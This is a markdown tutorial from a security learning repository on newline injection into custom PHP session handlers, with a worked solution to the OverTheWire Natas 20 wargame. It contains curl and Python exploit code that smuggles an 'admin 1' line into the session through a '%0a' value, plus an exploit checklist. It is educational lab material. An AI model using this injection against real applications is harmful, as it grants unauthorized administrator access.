# 🌐 Web Security — Session Manipulation & Newline Injection

> PHP session files are stored line by line in `key value` format.
> If you can inject a `\n` character into a value, you can add a fake line.

---

## 📋 Table of Contents

- [PHP Session File Format](#php-session-file-format)
- [What Is Newline Injection?](#what-is-newline-injection)
- [Adding Fake Data to the Session File](#adding-fake-data-to-the-session-file)
- [Usage in Natas](#usage-in-natas)

---

## PHP Session File Format

PHP stores session data in `/tmp/sess_[PHPSESSID]` files. The format:

```
key|s:length:"value";key2|i:number;
```

Example:

```
username|s:5:"admin";admin|i:0;
```

- `username|s:5:"admin";` → username = "admin" (5-character string)
- `admin|i:0;` → admin = 0 (integer)

If `admin|i:1;` can be written → admin privileges are gained.

---

## What Is Newline Injection?

**A warning first:** PHP's **native** session serializer (the `php` handler) uses a **length-prefixed** format: `username|s:5:"admin";`. Here `s:5` means "a 5-byte string" → even if you embed `\n` (or `|`, `;`) inside the value, PHP reads exactly **5 bytes**, the embedded characters remain PART of the string and do **not create a new entry.** In other words, the native PHP session format is **NOT** vulnerable to this kind of newline injection.

**So where does the vulnerability come from?** If the application writes its **own (custom)** handler that stores data line by line (`key value\n`) and reads it back with `explode("\n", ...)`, you can inject a `\n` into the input to add a fake line. Natas 20 is exactly this case.

```
# Custom, LINE-BASED handler (the vulnerable one):
Normal input:  "admin"        → in the file:  name admin
Malicious input: "admin\nadmin 1"
In the file:   name admin
               admin 1        ← explode("\n") reads a fake "admin=1" entry!
```

---

## Adding Fake Data to the Session File

### Step by Step

```python
import requests

# NOTE: this method is for a custom, LINE-BASED session handler
# (it does not work against the native php handler, which is length-prefixed).
# \n URL encoded: %0a
payload = "admin\nadmin 1"

# In the file (custom, line-based):
#   name admin
#   admin 1          ← the injected fake line
# When the app reads it with explode("\n"), an "admin=1" entry is created
```

### PHP Session Parse Logic

- **Native format (`php` handler):** length-prefixed (`key|s:LEN:"...";`). Because PHP reads exactly `LEN` bytes, an embedded `\n`/`|`/`;` does **not** create a new entry → **not vulnerable** to newline injection.
- **Custom line-based handler:** writes `key value\n` lines and reads them back with `explode("\n")` → an embedded `\n` adds a fake line → **this is where it's vulnerable.** Natas 20's vulnerability comes from this custom handler, not from the native format.

---

## Usage in Natas

### Natas 20 — Admin via Newline Injection

**Source code (summary):**

```php
function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION)
       and $_SESSION["admin"] == 1) {
        print "You are an admin. Password: <censored>";
    } else {
        print "You are logged in as a regular user.";
    }
}

function myread($sid) {
    // Read the session file
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = file_get_contents($filename);
    foreach(explode("\n", $data) as $line) {
        $parts = explode(" ", $line, 2);
        if($parts[0] != "")
            $_SESSION[$parts[0]] = $parts[1];
    }
}

function mywrite($sid, $data) {
    // Write to the session file
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    foreach($_SESSION as $key => $value) {
        $data .= "$key $value\n";   // ← write in key value\n format
    }
    file_put_contents($filename, $data);
}
```

**Format:** `key value\n` — different from PHP's standard format, a custom format.

**Analysis:**

The session file looks like this:
```
name admin
```

If we write `admin\nadmin 1` as the name:
```
name admin
admin 1        ← myread reads this as a separate line → $_SESSION['admin'] = 1
```

**Exploit:**

```bash
# Step 1: Send the name with newline + admin 1
curl -u natas20:[password] \
     -b "PHPSESSID=my_session_id" \
     --data "name=admin%0aadmin+1&debug=1" \
     "http://natas20.natas.labs.overthewire.org/"

# Step 2: Make another request with the same session (the session file was written, now it'll be read)
curl -u natas20:[password] \
     -b "PHPSESSID=my_session_id" \
     "http://natas20.natas.labs.overthewire.org/"
```

**With Python (two steps):**

```python
import requests

url      = "http://natas20.natas.labs.overthewire.org/"
username = "natas20"
password = "[natas20_password]"
session  = {"PHPSESSID": "hacked_session_123"}

# Step 1: Write the payload to the session
payload = "admin\nadmin 1"
r1 = requests.post(
    url,
    data={"name": payload, "debug": "1"},
    cookies=session,
    auth=(username, password)
)
print("[*] Session written")

# Step 2: Make another request with the same session
r2 = requests.get(
    url,
    cookies=session,
    auth=(username, password)
)

if "Password" in r2.text:
    print("[✓] Admin access obtained!")
    print(r2.text)
```

---

### Why Are Two Requests Needed?

```
Request 1: POST name=admin\nadmin 1
  → mywrite() runs → writes to the session file
  → myread() hasn't read the new data yet

Request 2: GET
  → myread() runs → reads the session file
  → finds the "admin 1" line → $_SESSION['admin'] = 1
  → print_credentials() → shows the password
```

---

### Newline Injection — Checklist

```
Detection:
  ☐ Does the application write user input to the session?
  ☐ Does the session file/data use a line-based format?
  ☐ Is \n or \r\n filtered?

Exploit:
  ☐ Test with %0a (URL encoded \n) or %0d%0a (\r\n)
  ☐ Two requests are needed: write first, then read
  ☐ If there's a debug parameter, it shows the session contents
```

---

## 🔗 Resources

- [OWASP — Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)
- [PHP — Custom Session Handlers](https://www.php.net/manual/en/function.session-set-save-handler.php)

---

**Previous topic:** [14_session_brute_force.md](./14_session_brute_force.md)
**Next topic:** [16_http_redirect_bypass.md](./16_http_redirect_bypass.md)

*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
